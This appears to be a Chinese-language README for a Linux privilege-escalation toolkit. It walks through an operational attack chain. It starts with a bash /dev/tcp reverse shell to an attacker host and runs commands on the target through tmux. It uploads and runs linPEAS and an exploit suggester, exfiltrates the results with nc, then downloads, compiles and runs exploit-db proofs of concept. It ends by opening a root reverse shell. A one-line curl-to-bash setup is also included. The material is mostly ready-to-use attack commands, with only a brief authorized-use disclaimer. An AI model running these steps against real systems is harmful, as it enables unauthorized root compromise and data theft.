# 🐧 linux-privesc-linpeas

> 端到端 Linux 提权辅助工具集 — **零硬编码 CVE，每次动态探测目标后匹配漏洞**

[![GitHub](https://img.shields.io/badge/GitHub-mcc0624%2Flinux--privesc--linpeas-blue)](https://github.com/mcc0624/linux-privesc-linpeas)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey)

---

## 📋 概述

自动化 Linux 提权工作流。**不预设任何固定漏洞信息**，每次运行都会根据目标内核/发行版/配置动态探测并匹配可用 CVE：

```
目标反弹 shell (6767)
       ↓
  tmux 管理 socat 监听
       ↓
  ┌─ 动态探测 ──────────────────────────┐
  │  linPEAS → 全量系统枚举 + 内置 CVE   │
  │  exploit-suggester → 内核漏洞匹配    │
  └──────────────┬──────────────────────┘
                 ↓
  ┌─ 动态下载 Exploit ──────────────────┐
  │  从 exploit-db / GitHub 获取 PoC    │
  │  编译 → 执行                        │
  └──────────────┬──────────────────────┘
                 ↓
  ┌─ 提权成功 ──────────────────────────┐
  │  root shell → 用户自备 8989 监听     │
  └──────────────────────────────────────┘
```

---

## 🔑 核心设计

- **零硬编码 CVE** — 不假定任何特定漏洞，全部来自探测结果
- **全部交互走 tmux** — `tmux send-keys` 发命令，`tmux capture-pane` 读输出
- **8989 用户自备** — 提权后 root shell 发送至此端口，监听由用户自行维护

---

## 🚀 快速开始

### 依赖检查

```bash
which socat nc python3 curl wget tmux gcc 2>/dev/null
```

### 一键部署

```bash
bash <(curl -sL https://raw.githubusercontent.com/mcc0624/linux-privesc-linpeas/main/scripts/setup_listener.sh)
```

### 手动部署

```bash
# 1. tmux + 6767 监听
tmux new-session -d -s revshell
tmux send-keys -t revshell "socat TCP-LISTEN:6767,fork,reuseaddr -" Enter

# 2. 下载探测工具（不含固定 exploit）
curl -sL -o /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
curl -sL -o /tmp/les.sh \
  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x /tmp/linpeas.sh /tmp/les.sh

# 3. HTTP 文件服务
cd /tmp && python3 -m http.server 8888 &

# 4. 提示用户
echo "另开终端: nc -lvnp 8989"
```

---

## 📖 工作流

### 第1步：目标反弹 shell 到 6767

```bash
# 目标机上
bash -i >& /dev/tcp/<攻击机IP>/6767 0>&1
```

### 第2步：tmux 交互 → 上传探测工具

```bash
# 基本信息
tmux send-keys -t revshell \
  "which wget curl python python3 nc gcc g++ 2>/dev/null; id; uname -a; cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null" Enter
sleep 3
tmux capture-pane -t revshell -p -S -20

# 上传 linPEAS
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<攻击机IP>:8888/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && echo OK" Enter
sleep 3

# 执行 linPEAS
tmux send-keys -t revshell "./linpeas.sh | tee /tmp/peas-out.txt && echo '===PEAS_DONE==='" Enter
```

### 第3步：取回结果

```bash
nc -lvp 9996 > /tmp/target_peas.txt 2>/dev/null &
tmux send-keys -t revshell "nc <攻击机IP> 9996 < /tmp/peas-out.txt" Enter
sleep 10
```

### 第4步：动态 CVE 匹配

```bash
# linPEAS 内置 CVE 匹配
grep -iE 'CVE-[0-9]{4}' /tmp/target_peas.txt | sort -u

# 或上传 exploit-suggester 跑一遍
tmux send-keys -t revshell \
  "wget -q http://<攻击机IP>:8888/les.sh -O les.sh && chmod +x les.sh && ./les.sh 2>/dev/null | tee /tmp/les-out.txt && echo '===LES_DONE==='" Enter
sleep 10
```

### 第5步：动态下载 Exploit

从 suggetser 输出中找到匹配的 exploit-db ID：

```bash
# 例: 从输出中看到 CVE-2015-1328, exploit-db ID 37292
EXPLOIT_ID=37292  # ← 替换为实际匹配的 ID

# 下载到本机 HTTP 目录
curl -sL -o /tmp/poc.c "https://www.exploit-db.com/raw/$EXPLOIT_ID"

# 上传到目标机编译执行
tmux send-keys -t revshell \
  "cd /tmp && wget -q http://<攻击机IP>:8888/poc.c -O exploit.c && gcc exploit.c -o exploit && ./exploit && id || echo FAIL" Enter
sleep 5
tmux capture-pane -t revshell -p -S -10
```

### 第6步：反转 root shell

```bash
# 确认 8989 监听已开启
tmux send-keys -t revshell \
  "bash -i >& /dev/tcp/<攻击机IP>/8989 0>&1" Enter
```

---

## 🛠 辅助脚本

| 脚本 | 用途 |
|------|------|
| `scripts/setup_listener.sh` | 一键部署环境（tmux + 监听 + HTTP + 探测工具） |
| `scripts/analyze_peas.py` | 自动解析 linPEAS 输出 |
| `scripts/recv_post.py` | HTTP POST 文件接收 |
| `references/CVE_QUICK_REF.md` | exploit 动态匹配参考 |

---

## ⚠️ 安全声明

- **仅限合法授权测试**
- 不预设任何固定 CVE，全部动态检测
- 8989 监听由用户自行维护
- 某些 exploit 可能导致目标不稳定

---

## 📚 技术参考

| 资源 | 链接 |
|------|------|
| linPEAS / PEASS-ng | https://github.com/peass-ng/PEASS-ng |
| Linux Exploit Suggester | https://github.com/mzet-/linux-exploit-suggester |
| HackTricks Linux PrivEsc | https://book.hacktricks.wiki |
| Exploit Database | https://www.exploit-db.com |

---

**不猜漏洞，测了才知道。**
